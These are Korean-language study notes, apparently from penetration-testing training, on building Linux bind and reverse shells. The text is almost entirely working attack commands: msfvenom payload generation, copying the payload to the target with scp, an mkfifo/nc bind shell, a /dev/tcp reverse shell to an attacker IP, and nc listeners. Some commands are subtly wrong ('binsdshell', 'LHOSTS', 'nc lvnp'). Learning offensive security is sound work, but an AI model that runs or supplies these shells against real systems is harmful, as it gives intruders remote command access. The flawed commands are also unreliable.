

# Bind Shell 페이로드 제작 자동화 – MSFVenom

**공격자
- 타겟은 리눅스 OS 이므로 elf 형식의 실행 파일로 페이로드 제작
```bash
msfvenom --list payloads
msfvenom -p <페이로드> --list-options      # 옵션 확인
msfvenom -p <페이로드> --list formats      # 파일 포맷 확인
msfvenom -p <페이로드종류> <옵션> -f <파일포맷> -o <출력파일>
```

`msfvenom -p linux/x64/shell_bind_tcp RHOSTS=<타겟 IP> RPORT=7777 -f elf -o binsdshell` - 타겟의 7777 포트 Open하는 페이로드 
`file bindshell` - 파일 타입 확인 (ELF 64-bit LSB executable)
`scp bindshell root@<타겟IP>:/tmp/bindshell` - 타겟 시스템으로 전송


**타겟
`chmod +x binsdshell` - 실행 권한
`./bindshell`

**공격자
`nc <타겟IP> 7777` - nc 연결
> 이 방식의 단점은 msfvenom(자동화 도구) 사용은 타겟으로 파일을 보낸 뒤, 실행 권한까지 줘야함


# Bind Shell 페이로드 제작 - 수동
https://www.revshells.com/ -  해당 사이트는 파이썬,자바스크립트,명령어로 nc 연결하는 등 여러 페이로드 확인 가능
> `Bind` 탭의 `nc Bind` 메뉴에 들어가서 명령어 복사 
> `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f`

**타겟
타겟 PC에서 `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f` 명령어 실행

**공격자
`nc <타겟IP> 9001` - nc 연결





# Reverse Shell 페이로드 제작 자동화 – MSFVenom

**공격자
- 타겟은 리눅스 OS 이므로 elf 형식의 실행 파일로 페이로드 제작
```bash
msfvenom --list payloads
msfvenom -p <페이로드> --list-options      # 옵션 확인
msfvenom -p <페이로드> --list formats      # 파일 포맷 확인
msfvenom -p <페이로드종류> <옵션> -f <파일포맷> -o <출력파일>
```


`msfvenom -p linux/x64/shell_reverse_tcp LHOSTS=<공격자 IP> LPORT=6666 -f elf -o reverseshell`
`file reverseshell` - 파일 타입 확인 (ELF 64-bit LSB executable)
`scp reverseshell root@<타겟IP>:/tmp/reverseshell` - 타겟 시스템으로 전송
`nc lvnp 6666` - nc 연결 대기


**타겟
`chmod +x binsdshell` - 실행 권한
`./reverseshell`

> 이 방식의 단점은 msfvenom(자동화 도구) 사용은 타겟에게 파일을 보낸 뒤, 실행 권한까지 줘야함


# Reverse Shell 페이로드 제작 - 수동
https://www.revshells.com/ -  해당 사이트는 다양한 페이로드, 명령어로 nc 연결하는 등 여러 페이로드 확인 가능
> `Reverse` 탭의 `Bash -i` 메뉴에 들어가서 명령어 복사 
> `sh -i >& /dev/tcp/<공격자IP>/9001 0>&1`

**공격자
`nc lvnp 9001` - nc 연결 대기

**타겟
타겟 PC에서 `sh -i >& /dev/tcp/<공격자IP>/9001 0>&1` 명령어 실행 시 nc 연결 확인





 
 
 
 
 